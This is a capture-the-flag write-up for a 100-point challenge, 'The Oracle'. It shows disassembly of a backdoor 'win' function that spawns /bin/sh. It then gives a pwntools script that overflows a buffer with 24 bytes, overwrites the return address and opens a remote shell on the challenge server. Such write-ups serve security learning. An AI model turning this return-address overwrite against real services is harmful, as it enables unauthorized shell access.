### The Oracle (100 Points)

> Would you still have broken it if I hadn't said anything?
>
> [attachment](theoracle-ef25f23d8a2218004732f71bfbfa1267)

ret2text!

Disasm the .text segment then we can see the win function is a backdoor. so we just need to use overflow to cover the return address to win 😄

```c
.text:0000000000401196 win             proc near
.text:0000000000401196 ; __unwind {
.text:0000000000401196                 endbr64
.text:000000000040119A                 push    rbp
.text:000000000040119B                 mov     rbp, rsp
.text:000000000040119E                 sub     rsp, 10h
.text:00000000004011A2                 mov     qword ptr [rbp-8], 0
.text:00000000004011AA                 mov     qword ptr [rbp-10h], 0
.text:00000000004011B2                 lea     rdx, [rbp-10h]
.text:00000000004011B6                 lea     rax, [rbp-8]
.text:00000000004011BA                 mov     rsi, rax
.text:00000000004011BD                 lea     rdi, aBinSh     ; "/bin/sh"
.text:00000000004011C4                 call    sub_401090
.text:00000000004011C9                 nop
.text:00000000004011CA                 leave
.text:00000000004011CB                 retn
.text:00000000004011CB ; } // starts at 401196
.text:00000000004011CB win             endp
```

#### exploit script

```python
#!/usr/bin/env python
from pwn import *
context.log_level='debug'

p = remote('chal.ctf.b01lers.com',1015)
p.recvuntil('Thyself.\n')
p.sendline('A'*24+p64(0x401196))
p.sendline('sh')

p.interactive()
```

